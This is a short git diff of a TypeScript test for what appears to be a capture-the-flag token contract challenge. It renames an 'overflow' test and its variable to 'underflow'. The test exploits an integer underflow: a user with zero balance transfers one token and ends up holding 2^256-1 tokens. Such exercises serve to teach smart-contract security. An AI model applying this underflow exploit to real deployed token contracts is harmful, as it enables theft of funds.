@@ -38,13 +38,13 @@ describe('Token Tests', () => {
     });
 
     describe('Pwn Contract', async () => {
-        it('Cause Integer Overflow', async () => {
+        it('Cause Integer Underflow', async () => {
             // User has no tokens
             expect(await token.balanceOf(userWallet.address)).to.equal(0);
 
             // Transfer causing underflow
-            const overflowAmt: BigNumber = ethers.BigNumber.from('1');
-            await token.connect(userWallet).transfer(deployerWallet.address, overflowAmt);
+            const underflowAmt: BigNumber = ethers.BigNumber.from('1');
+            await token.connect(userWallet).transfer(deployerWallet.address, underflowAmt);
 
             // User now has tons of tokens
             const tonsTokens: BigNumber = ethers.BigNumber.from(2).pow(256).sub(1);
